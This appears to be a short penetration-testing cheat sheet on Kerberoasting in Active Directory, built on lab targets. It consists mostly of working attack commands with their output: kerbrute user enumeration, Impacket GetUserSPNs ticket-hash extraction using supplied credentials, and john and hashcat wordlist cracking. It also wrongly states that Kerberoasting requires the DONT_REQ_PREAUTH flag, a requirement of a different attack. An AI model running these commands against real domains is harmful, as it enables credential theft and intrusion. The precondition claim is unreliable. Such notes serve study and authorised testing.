# Kerberoasting

Kerberoasting is a type of attack against Microsoft Active Directory environments that involves extracting service account passwords from Kerberos tickets. Service accounts are often used to run automated processes and scheduled tasks, and because they often have high privileges within an organization, they can be a valuable target for attackers.

The basic method of kerberoasting involves requesting a ticket for a service account, then cracking the encrypted password hash that is included in the ticket.

# Pre-Requisites

Kerberoastable users need to have the `DONT_REQ_PREAUTH` flag set.

``` 
$   kerbrute userenum -d MCDONALDS.LOCAL SecLists/Usernames/xato-net-10-million-usernames.txt --dc dc-01.htb                                                            


    __             __               __     
   / /_____  _____/ /_  _______  __/ /____ 
  / //_/ _ \/ ___/ __ \/ ___/ / / / __/ _ \
 / ,< /  __/ /  / /_/ / /  / /_/ / /_/  __/
/_/|_|\___/_/  /_.___/_/   \__,_/\__/\___/                                        

Version: dev (n/a) - 02/08/23 - Ronnie Flathers @ropnop

2023/02/08 14:26:09 >  Using KDC(s):
2023/02/08 14:26:09 >   10.10.10.175:88

2023/02/08 14:26:45 >  [+] VALID USERNAME:       administrator@MCDONALDS.LOCAL
2023/02/08 14:30:08 >  [+] VALID USERNAME:       dudi@MCDONALDS.LOCAL
2023/02/08 14:30:32 >  [+] VALID USERNAME:       sagi@MCDONALDS.LOCAL
2023/02/08 14:31:49 >  [+] VALID USERNAME:       ido@MCDONALDS.LOCAL
2023/02/08 14:48:58 >  [+] VALID USERNAME:       overlord@MCDONALDS.LOCAL
```

# SPNs

If a user account has an SPN, we can request a TGS on his behalf, which we can crack offline to get the password.

```
python GetUserSPNs.py -k scrm.local/ksimpson:ksimpson -dc-ip 10.10.11.168 -target-domain scrm.local -dc-host dc1.scrm.local -outputfile kerberoastables.txt
```
```
Impacket v0.10.0 - Copyright 2022 SecureAuth Corporation
ServicePrincipalName          Name    MemberOf  PasswordLastSet             LastLogon                   Delegation
----------------------------  ------  --------  --------------------------  --------------------------  ----------
MSSQLSvc/dc1.scrm.local:1433  sqlsvc            2021-11-03 12:32:02.351452  2023-05-21 11:51:15.168848
MSSQLSvc/dc1.scrm.local       sqlsvc            2021-11-03 12:32:02.351452  2023-05-21 11:51:15.168848
```
Cracking the hash:
```
john kerberoastables.txt --wordlist=/usr/share/wordlists/rockyou.txt
```
```
hashcat -a 0 -m 19600 kerberoastable.txt /usr/share/wordlists/rockyou.txt
# -m flags
  19600 | Kerberos 5, etype 17, TGS-REP
  19700 | Kerberos 5, etype 18, TGS-REP
  13100 | Kerberos 5, etype 23, TGS-REP
```
